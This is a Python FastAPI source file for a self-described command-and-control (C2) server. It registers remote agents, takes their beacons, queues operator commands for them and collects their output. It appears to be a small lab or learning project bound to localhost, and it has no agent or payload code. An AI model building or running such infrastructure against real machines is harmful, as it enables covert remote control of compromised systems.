import uvicorn
from fastapi import FastAPI, Request
from contextlib import asynccontextmanager

from database import (
    init_db,
    register_agent,
    update_last_seen,
    get_all_agents
)

# -------------------------
# Startup
# -------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    print("[*] Starting C2 Server...")
    init_db()
    yield
    print("[*] Shutting down C2 Server...")

app = FastAPI(lifespan=lifespan)

# In-memory task storage
tasks = []

# -------------------------
# Register Agent
# -------------------------
@app.post("/register")
async def register(request: Request):
    data = await request.json()
    agent_id = register_agent(data)

    print(f"[+] Agent Registered: {agent_id}")
    return {"agent_id": agent_id}


# -------------------------
# Beacon (Agent check-in)
# -------------------------
@app.post("/beacon/{agent_id}")
def beacon(agent_id: str):
    update_last_seen(agent_id)

    for task in tasks:
        if task["agent_id"] == agent_id and task["status"] == "pending":
            task["status"] = "sent"
            print(f"[>] Sending task to {agent_id}: {task['command']}")
            return {"task": task["command"]}

    return {"task": None}


# -------------------------
# Receive command result
# -------------------------
@app.post("/result/{agent_id}")
def receive_result(agent_id: str, data: dict):
    command = data.get("command")
    output = data.get("output")

    for task in tasks:
        if task["agent_id"] == agent_id and task["command"] == command:
            task["status"] = "completed"
            task["result"] = output

    print(f"[+] Result from {agent_id}")
    print(output)

    return {"status": "stored"}


# -------------------------
# Create task (operator)
# -------------------------
@app.post("/task/{agent_id}")
def create_task(agent_id: str, data: dict):
    command = data.get("command")

    task = {
        "agent_id": agent_id,
        "command": command,
        "status": "pending",
        "result": None
    }

    tasks.append(task)

    print(f"[+] Task added for {agent_id}: {command}")
    return {"message": "Task queued"}


# -------------------------
# List agents
# -------------------------
@app.get("/agents")
def list_agents():
    return get_all_agents()


# -------------------------
# View tasks
# -------------------------
@app.get("/tasks")
def list_tasks():
    return tasks


# -------------------------
# Run server
# -------------------------
if __name__ == "__main__":
    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)